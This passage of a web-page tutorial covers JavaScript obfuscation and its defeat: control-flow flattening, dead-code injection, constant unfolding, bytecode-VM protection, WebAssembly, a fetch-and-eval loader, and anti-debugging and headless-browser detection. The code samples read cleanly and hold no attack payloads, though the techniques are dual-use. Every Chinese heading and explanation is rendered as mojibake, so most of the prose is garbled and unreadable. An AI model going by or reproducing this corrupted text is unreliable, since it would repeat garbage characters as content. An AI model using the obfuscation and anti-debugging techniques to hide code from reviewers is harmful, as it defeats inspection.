<span class="w">                </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">transform</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
<span class="w">                </span><span class="nx">_0x1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="w">                </span><span class="k">break</span><span class="p">;</span>
<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="mf">1</span><span class="o">:</span>
<span class="w">                </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
<span class="w">                </span><span class="nx">_0x1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3</span><span class="p">;</span>
<span class="w">                </span><span class="k">break</span><span class="p">;</span>
<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="mf">3</span><span class="o">:</span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>ç ´è§£æ–¹æ³•</strong>:</p>

      <ul>
        <li>ç¬¦å·æ‰§è¡Œæ¢å¤æ§åˆ¶æµ</li>
        <li>åŠ¨æ€è°ƒè¯•è¿½è¸ªæ‰§è¡Œè·¯å¾„</li>
        <li>ä½¿ç”¨ AST åˆ†æå·¥å…·é‡æ„</li>
      </ul>

      <h3 id="4-åƒµå°¸ä»£ç æ³¨å…¥-dead-code-injection">4. åƒµå°¸ä»£ç æ³¨å…¥ (Dead Code Injection)</h3>

      <p><strong>åŸç†</strong>: æ’å…¥æ°¸è¿œä¸ä¼šæ‰§è¡Œçš„ä»£ç ï¼Œå¢åŠ åˆ†æéš¾åº¦ã€‚</p>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">login</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// çœŸå®é€»è¾‘</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">username</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">authenticate</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// åƒµå°¸ä»£ç ï¼ˆæ°¸è¿œä¸ä¼šæ‰§è¡Œï¼‰</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;This code never runs&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/fake-endpoint&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">fake</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="p">(</span><span class="nx">username</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// æ›´å¤šåƒµå°¸ä»£ç </span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="ow">void</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>ç ´è§£æ–¹æ³•</strong>:</p>

      <ul>
        <li>ä»£ç è¦†ç›–ç‡åˆ†æ</li>
        <li>åŠ¨æ€æ‰§è¡Œè¿½è¸ª</li>
        <li>åˆ é™¤ä¸å¯è¾¾ä»£ç </li>
      </ul>

      <h3 id="5-å¸¸é‡æŠ˜å åæ··æ·†-constant-unfolding">5. å¸¸é‡æŠ˜å åæ··æ·† (Constant Unfolding)</h3>

      <p><strong>åŸç†</strong>: å°†ç®€å•å¸¸é‡æ‹†åˆ†ä¸ºå¤æ‚è¡¨è¾¾å¼ã€‚</p>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åŸå§‹</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">timeout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5000</span><span class="p">;</span>

<span class="c1">// æ··æ·†å</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">timeout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="mh">0x3e8</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x5</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="mh">0x1f4</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x64</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="mh">0xc8</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mh">0x32</span><span class="p">);</span>
<span class="c1">// = (1000 * 5) + (500 - 100) + (200 | 50)</span>
</code></pre>
      </div>

      <p><strong>ç ´è§£æ–¹æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ä½¿ç”¨ JavaScript å¼•æ“è‡ªåŠ¨è®¡ç®—</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">((</span><span class="mh">0x3e8</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x5</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="mh">0x1f4</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x64</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="mh">0xc8</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mh">0x32</span><span class="p">));</span>
</code></pre>
      </div>

      <h3 id="6-å¯¹è±¡é”®éšè—">6. å¯¹è±¡é”®éšè—</h3>

      <p><strong>åŸç†</strong>: ä½¿ç”¨è®¡ç®—å±æ€§åéšè—å¯¹è±¡é”®ã€‚</p>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åŸå§‹</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">apiKey</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;secret123&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nx">endpoint</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;/api/data&quot;</span>
<span class="p">};</span>

<span class="c1">// æ··æ·†å</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">_0x1a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;apiKey&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;endpoint&#39;</span><span class="p">];</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="p">[</span><span class="nx">_0x1a</span><span class="p">[</span><span class="mf">0</span><span class="p">]]</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;secret123&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="p">[</span><span class="nx">_0x1a</span><span class="p">[</span><span class="mf">1</span><span class="p">]]</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;/api/data&quot;</span>
<span class="p">};</span>
</code></pre>
      </div>

      <hr />

      <h2 id="javascript-è™šæ‹Ÿæœºä¿æŠ¤-vm-protection">JavaScript è™šæ‹Ÿæœºä¿æŠ¤ (VM Protection)</h2>

      <h3 id="åŸç†">åŸç†</h3>

      <p>å°† JavaScript ä»£ç ç¼–è¯‘ä¸ºè‡ªå®šä¹‰å­—èŠ‚ç ï¼Œè¿è¡Œæ—¶ç”±è™šæ‹Ÿæœºè§£é‡Šæ‰§è¡Œã€‚</p>

      <p><strong>æµç¨‹</strong>:</p>

      <pre><code>åŸå§‹ä»£ç  â†’ ç¼–è¯‘å™¨ â†’ å­—èŠ‚ç  â†’ è™šæ‹Ÿæœº â†’ æ‰§è¡Œ
</code></pre>

      <h3 id="å®ç°æ¶æ„">å®ç°æ¶æ„</h3>

      <p><strong>1. å­—èŠ‚ç è®¾è®¡</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ç¤ºä¾‹å­—èŠ‚ç æŒ‡ä»¤é›†</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">OPCODES</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">PUSH</span><span class="o">:</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w">      </span><span class="c1">// å‹æ ˆ</span>
<span class="w">    </span><span class="nx">POP</span><span class="o">:</span><span class="w"> </span><span class="mh">0x02</span><span class="p">,</span><span class="w">       </span><span class="c1">// å‡ºæ ˆ</span>
<span class="w">    </span><span class="nx">ADD</span><span class="o">:</span><span class="w"> </span><span class="mh">0x03</span><span class="p">,</span><span class="w">       </span><span class="c1">// åŠ æ³•</span>
<span class="w">    </span><span class="nx">SUB</span><span class="o">:</span><span class="w"> </span><span class="mh">0x04</span><span class="p">,</span><span class="w">       </span><span class="c1">// å‡æ³•</span>
<span class="w">    </span><span class="nx">CALL</span><span class="o">:</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w">      </span><span class="c1">// å‡½æ•°è°ƒç”¨</span>
<span class="w">    </span><span class="nx">RET</span><span class="o">:</span><span class="w"> </span><span class="mh">0x06</span><span class="p">,</span><span class="w">       </span><span class="c1">// è¿”å›</span>
<span class="w">    </span><span class="nx">JMP</span><span class="o">:</span><span class="w"> </span><span class="mh">0x07</span><span class="p">,</span><span class="w">       </span><span class="c1">// è·³è½¬</span>
<span class="w">    </span><span class="nx">LOAD</span><span class="o">:</span><span class="w"> </span><span class="mh">0x08</span><span class="p">,</span><span class="w">      </span><span class="c1">// åŠ è½½å˜é‡</span>
<span class="w">    </span><span class="nx">STORE</span><span class="o">:</span><span class="w"> </span><span class="mh">0x09</span><span class="w">      </span><span class="c1">// å­˜å‚¨å˜é‡</span>
<span class="p">};</span>
</code></pre>
      </div>

      <p><strong>2. è™šæ‹Ÿæœºå®ç°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">class</span><span class="w"> </span><span class="nx">VM</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">bytecode</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">bytecode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bytecode</span><span class="p">;</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">stack</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">pc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w">  </span><span class="c1">// Program Counter</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">vars</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{};</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">execute</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">pc</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">bytecode</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">opcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">bytecode</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">pc</span><span class="o">++</span><span class="p">];</span>

<span class="w">            </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="nx">opcode</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="nx">OPCODES</span><span class="p">.</span><span class="nx">PUSH</span><span class="o">:</span>
<span class="w">                    </span><span class="kd">const</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">bytecode</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">pc</span><span class="o">++</span><span class="p">];</span>
<span class="w">                    </span><span class="k">this</span><span class="p">.</span><span class="nx">stack</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">value</span><span class="p">);</span>
<span class="w">                    </span><span class="k">break</span><span class="p">;</span>

<span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="nx">OPCODES</span><span class="p">.</span><span class="nx">ADD</span><span class="o">:</span>
<span class="w">                    </span><span class="kd">const</span><span class="w"> </span><span class="nx">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">stack</span><span class="p">.</span><span class="nx">pop</span><span class="p">();</span>
<span class="w">                    </span><span class="kd">const</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">stack</span><span class="p">.</span><span class="nx">pop</span><span class="p">();</span>
<span class="w">                    </span><span class="k">this</span><span class="p">.</span><span class="nx">stack</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">a</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">b</span><span class="p">);</span>
<span class="w">                    </span><span class="k">break</span><span class="p">;</span>

<span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="nx">OPCODES</span><span class="p">.</span><span class="nx">CALL</span><span class="o">:</span>
<span class="w">                    </span><span class="kd">const</span><span class="w"> </span><span class="nx">funcId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">bytecode</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">pc</span><span class="o">++</span><span class="p">];</span>
<span class="w">                    </span><span class="k">this</span><span class="p">.</span><span class="nx">callFunction</span><span class="p">(</span><span class="nx">funcId</span><span class="p">);</span>
<span class="w">                    </span><span class="k">break</span><span class="p">;</span>

<span class="w">                </span><span class="c1">// å…¶ä»–æŒ‡ä»¤...</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>3. ç¼–è¯‘å™¨</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">compile</span><span class="p">(</span><span class="nx">ast</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">bytecode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">visit</span><span class="p">(</span><span class="nx">node</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="nx">node</span><span class="p">.</span><span class="nx">type</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;BinaryExpression&#39;</span><span class="o">:</span>
<span class="w">                </span><span class="nx">visit</span><span class="p">(</span><span class="nx">node</span><span class="p">.</span><span class="nx">left</span><span class="p">);</span>
<span class="w">                </span><span class="nx">visit</span><span class="p">(</span><span class="nx">node</span><span class="p">.</span><span class="nx">right</span><span class="p">);</span>
<span class="w">                </span><span class="nx">bytecode</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">getOpcode</span><span class="p">(</span><span class="nx">node</span><span class="p">.</span><span class="nx">operator</span><span class="p">));</span>
<span class="w">                </span><span class="k">break</span><span class="p">;</span>

<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;Literal&#39;</span><span class="o">:</span>
<span class="w">                </span><span class="nx">bytecode</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">OPCODES</span><span class="p">.</span><span class="nx">PUSH</span><span class="p">);</span>
<span class="w">                </span><span class="nx">bytecode</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">node</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
<span class="w">                </span><span class="k">break</span><span class="p">;</span>

<span class="w">            </span><span class="c1">// å…¶ä»–èŠ‚ç‚¹ç±»å‹...</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">visit</span><span class="p">(</span><span class="nx">ast</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">bytecode</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="å•†ä¸šåŒ–è™šæ‹Ÿæœºä¿æŠ¤">å•†ä¸šåŒ–è™šæ‹Ÿæœºä¿æŠ¤</h3>

      <p><strong>JScrambler</strong>:</p>

      <ul>
        <li>å¤šå±‚è™šæ‹ŸæœºåµŒå¥—</li>
        <li>è‡ªä¿®æ”¹ä»£ç </li>
        <li>åè°ƒè¯•æ£€æµ‹</li>
      </ul>

      <p><strong>JShaman</strong>:</p>

      <ul>
        <li>åŸç”Ÿä»£ç æ··åˆï¼ˆNode.js æ’ä»¶ï¼‰</li>
        <li>ä»£ç åŠ å¯†</li>
        <li>è¿è¡Œæ—¶è§£å¯†</li>
      </ul>

      <p>è¯¦è§ <a href="#04-Advanced-Recipes-javascript-vm-protection">JavaScript è™šæ‹Ÿæœºä¿æŠ¤</a></p>

      <hr />

      <h2 id="webassembly-ç¼–è¯‘">WebAssembly ç¼–è¯‘</h2>

      <p><strong>åŸç†</strong>: å°†æ ¸å¿ƒé€»è¾‘ç¼–è¯‘ä¸º WebAssembly äºŒè¿›åˆ¶æ ¼å¼ã€‚</p>

      <p><strong>ä¼˜åŠ¿</strong>:</p>

      <ul>
        <li>æ¥è¿‘åŸç”Ÿæ€§èƒ½</li>
        <li>äºŒè¿›åˆ¶æ ¼å¼ï¼Œéš¾ä»¥é€†å‘</li>
        <li>è·¨å¹³å°æ”¯æŒ</li>
      </ul>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// C ä»£ç </span>
<span class="kt">int</span><span class="w"> </span><span class="nf">encrypt</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">data</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x5A5A</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p>ç¼–è¯‘ä¸º WebAssembly:</p>

      <div class="codehilite">
        <pre><span></span><code>emcc<span class="w"> </span>encrypt.c<span class="w"> </span>-o<span class="w"> </span>encrypt.js<span class="w"> </span>-s<span class="w"> </span><span class="nv">EXPORTED_FUNCTIONS</span><span class="o">=</span><span class="s1">&#39;[&quot;_encrypt&quot;]&#39;</span>
</code></pre>
      </div>

      <p>åœ¨ JavaScript ä¸­è°ƒç”¨:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">Module</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./encrypt.js&#39;</span><span class="p">);</span>
<span class="nx">Module</span><span class="p">.</span><span class="nx">onRuntimeInitialized</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Module</span><span class="p">.</span><span class="nx">_encrypt</span><span class="p">(</span><span class="mf">12345</span><span class="p">,</span><span class="w"> </span><span class="mf">67890</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Encrypted:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">);</span>
<span class="p">};</span>
</code></pre>
      </div>

      <p>è¯¦è§ <a href="#04-Advanced-Recipes-webassembly-reversing">WebAssembly é€†å‘</a></p>

      <hr />

      <h2 id="é«˜çº§ä¿æŠ¤æŠ€æœ¯">é«˜çº§ä¿æŠ¤æŠ€æœ¯</h2>

      <h3 id="1-ä»£ç åˆ†ç‰‡-code-splitting">1. ä»£ç åˆ†ç‰‡ (Code Splitting)</h3>

      <p><strong>åŸç†</strong>: å°†ä»£ç åˆ†æ•£åˆ°å¤šä¸ªæ–‡ä»¶ï¼ŒåŠ¨æ€åŠ è½½ã€‚</p>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ä¸»æ–‡ä»¶åªåŒ…å«åŠ è½½å™¨</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">loader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">loadModule</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="sb">`/modules/</span><span class="si">${</span><span class="nx">name</span><span class="si">}</span><span class="sb">.js`</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">eval</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">};</span>

<span class="c1">// ä½¿ç”¨æ—¶åŠ¨æ€åŠ è½½</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">crypto</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">loader</span><span class="p">.</span><span class="nx">loadModule</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>
<span class="nx">crypto</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="2-ç¯å¢ƒæ£€æµ‹ä¸åè°ƒè¯•">2. ç¯å¢ƒæ£€æµ‹ä¸åè°ƒè¯•</h3>

      <p><strong>æ£€æµ‹ DevTools</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ–¹æ³•1: æ£€æµ‹çª—å£å°ºå¯¸</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">threshold</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">160</span><span class="p">;</span>
<span class="w">    </span><span class="nx">setInterval</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">outerHeight</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">innerHeight</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">threshold</span><span class="w"> </span><span class="o">||</span>
<span class="w">            </span><span class="nb">window</span><span class="p">.</span><span class="nx">outerWidth</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">innerWidth</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">threshold</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;DevTools detected!&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="k">debugger</span><span class="p">;</span><span class="w">  </span><span class="c1">// è§¦å‘æ–­ç‚¹</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">},</span><span class="w"> </span><span class="mf">1000</span><span class="p">);</span>
<span class="p">})();</span>

<span class="c1">// æ–¹æ³•2: åˆ©ç”¨ toString æ£€æµ‹</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">element</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Image</span><span class="p">();</span>
<span class="w">    </span><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;id&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">get</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;DevTools detected via property access!&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="k">debugger</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">element</span><span class="p">);</span>
<span class="p">})();</span>

<span class="c1">// æ–¹æ³•3: æ£€æµ‹ console</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">before</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Date</span><span class="p">();</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">after</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Date</span><span class="p">();</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">after</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">before</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">100</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Debugger detected!&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;about:blank&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <p><strong>æ£€æµ‹è‡ªåŠ¨åŒ–å·¥å…·</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ£€æµ‹ Selenium</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">webdriver</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Selenium detected!&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// æ£€æµ‹ Puppeteer/Playwright</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">plugins</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Headless browser detected!&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// æ£€æµ‹ PhantomJS</span>
